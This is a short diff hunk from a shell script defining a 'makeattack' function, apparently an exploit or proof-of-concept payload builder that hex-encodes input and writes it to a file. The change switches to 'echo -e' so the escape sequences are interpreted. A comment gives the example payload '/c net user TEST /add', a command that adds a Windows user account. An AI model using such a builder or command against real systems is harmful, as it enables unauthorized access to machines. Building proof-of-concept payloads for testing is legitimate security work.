@@ -42,7 +42,7 @@ makeattack() {
  hexdump -e '16/1 "%02x"' | \
  tr -d " \n" | \
  sed -r 's/(.{2})/\\\x\1/g'`;
- echo $constructor$trailer > $2;
+ echo -e $constructor$trailer > $2;
 } # Example use: makeattack "/c net user TEST /add"
 #
 # In addition, this is a test to see if users could be added to a system 
